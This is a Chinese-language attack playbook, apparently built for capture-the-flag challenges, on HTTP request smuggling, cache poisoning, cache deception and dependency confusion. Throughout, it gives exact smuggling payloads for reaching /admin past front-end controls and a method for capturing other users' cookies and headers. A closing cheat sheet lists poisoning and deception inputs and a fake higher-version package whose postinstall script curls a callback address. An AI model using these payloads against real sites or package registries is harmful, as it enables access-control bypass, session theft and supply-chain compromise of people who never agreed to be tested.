# HTTP 请求走私与缓存攻击手册

适用题型（命中即召回本手册）：请求走私 request-smuggling 走私 CL.TE TE.CL
TE.TE desync HTTP/2 H2 降级 Transfer-Encoding Content-Length 缓存投毒
cache-poisoning 缓存欺骗 cache-deception X-Forwarded-Host X-Original-URL
unkeyed 依赖混淆 dependency-confusion 供应链 CDN 反向代理

## 1. 识别与分类
- 走私判据：前端代理(CDN/WAF/负载均衡)与后端对请求边界判定不一致；同一连接
  连续请求出现错位/拼接/偶发 400/405；请求同时带 Content-Length 与
  Transfer-Encoding 时行为异常。
- 缓存判据：响应头含 X-Cache/Age/Via/CF-Cache-Status/X-Served-By 说明有缓存层；
  缓存键通常只含 Host+路径+部分查询参数，其余输入为 unkeyed。
- 分类：CL.TE(前端信 CL 后端信 TE) / TE.CL(前端信 TE 后端信 CL) /
  TE.TE(两端都解析 TE 但规则不同) / H2 降级走私 / 缓存欺骗(偷隐私数据) /
  缓存投毒(注入恶意响应) / 依赖混淆(供应链投毒)。

## 2. 攻击方法论
1. 架构识别：`curl -sI 目标 | grep -iE "server|via|x-cache|cf-ray|age"` 判断代理链；
   `curl --http2 -sI 目标` 看是否支持 HTTP/2。
2. CL.TE 探测：同发 `Content-Length: 13` + `Transfer-Encoding: chunked`，body 为
   `0\r\n\r\nSMUGGLED`(13 字节)；前端读完即结束、后端按 chunked 把 SMUGGLED
   当作下一请求开头 → 命中。
3. CL.TE 时间盲测：`Content-Length: 4` + `Transfer-Encoding: chunked`，body 发
   `1\r\nA\r\nX`；后端等 chunk 结束而延迟 5~10s → 判定 CL.TE。
4. TE.CL 探测：`Content-Length: 4` + `Transfer-Encoding: chunked`，body 首行
   `35`(十六进制=内嵌请求字节数) 后接 `GET /admin HTTP/1.1...` 再 `0`；后端只读
   长度行，剩余字节拼入下一请求 → 下个请求 400/405。
5. TE.TE 混淆枚举：`Transfer-Encoding: xchunked`、名后空格 `TE : chunked`、
   重复 TE 头、行首空格、TAB 分隔、名称与冒号分行，逐一测两端哪侧接受为 chunked。
6. 利用：走私 `GET /admin` 绕过前端鉴权/WAF；走私 POST 到评论/存储端点并设
   `Content-Length: 400` 捕获下个用户请求(cookie/头)；走私+缓存键错位做投毒。
7. H2 降级：前端 H2 后降级 H1 时发 `content-length: 0` + 帧 body 内嵌
   `GET /admin HTTP/1.1`(H2.CL)；TE 未被剥离则 H2.TE；发 `Upgrade: h2c` 探测
   h2c 直连绕过代理。
8. 缓存投毒：对 X-Forwarded-Host / X-Forwarded-Scheme / X-Original-URL /
   X-Forwarded-For 等 unkeyed 头注入值，看是否反射进响应(链接/og 标签/跳转)且
   被缓存；二次不带该头请求仍命中恶意缓存即确认。
9. 缓存欺骗：敏感接口加静态尾缀 `.../profile/x.css`、`;.css`、`%2F.css`、
   `/..%2fstatic/x.js`；先带受害会话请求一次，再匿名请求命中 X-Cache:HIT 且含
   敏感数据即确认。
10. 依赖混淆：从 package.json / requirements.txt / pom.xml 收集内部包名，同名+
    更高 semver 发布到公共源，用 preinstall/postinstall 生命周期脚本外带回调证明执行。

## 3. 变体与绕过
- 无回显盲打：用时序差异(延迟)、连接复用后下个请求报错、内网 DNS/HTTP 回调外带；
  走私 body 长度必须按 chunked 十六进制精确计算(改路径/头需重算长度)。
- TE/CL 过滤绕过：TE 头大小写/空格/TAB/行首空格/前缀伪造(xchunked)/名称冒号分行；
  H2 在 header 值注入 `\r\n\r\nGET / HTTP/1.1` 让降级层误分帧。
- 缓存键绕过：参数 cloaking 用 `cb=1&cb=2` 或分号/`#` 截断制造键差异；Vary 头缺失
  时跨用户命中；CDN 与后端路径规范化不一致(`;`、`..`、尾点)即欺骗面。
- 依赖混淆边界：私有源硬锁定(scoped+registry 映射/单 index/mirror)则风险低；否则
  公共源能提供更高版本即视为可投毒；先看是否强制 lockfile 与精确版本。

## 战法要点
- 先确认"两端两跳"架构再走私；单层应用改走 H2 desync/h2c。
- 每次走私改动路径/头后必须重算 chunk 长度，否则探测无效。
- 缓存投毒先找"被反射但不在缓存键"的输入，unkeyed 头/参数/GET body 都测。
- 欺骗与投毒别混淆：欺骗偷数据(.css 尾缀)，投毒注恶意响应(unkeyed 头)。
- 离线环境用内网可控回调/日志代替 Collaborator 外带。
- 依赖混淆只要公共源能出更高版本就视为可投毒；先看是否硬锁定私有源。

## 速查清单
```text
CL.TE:  Content-Length: 13 + Transfer-Encoding: chunked
        body: 0\r\n\r\nSMUGGLED            # 13 字节
TE.CL:  Content-Length: 4 + Transfer-Encoding: chunked
        body: 35\r\nGET /admin HTTP/1.1\r\nHost: x\r\n\r\n0\r\n\r\n
TE.TE:  Transfer-Encoding: xchunked | "TE : chunked" | 重复头 | 行首空格
H2.CL:  :method POST + content-length: 0 + body: GET /admin HTTP/1.1
h2c:    Upgrade: h2c + HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
投毒:   curl -H "X-Forwarded-Host: evil" 目标   # 反射且缓存即中
欺骗:   /account/profile/x.css  ;.css  %2F.css  /..%2fstatic/x.js
依赖:   同名包 + version: 9.9.9 + "postinstall": "curl 回调地址"
```
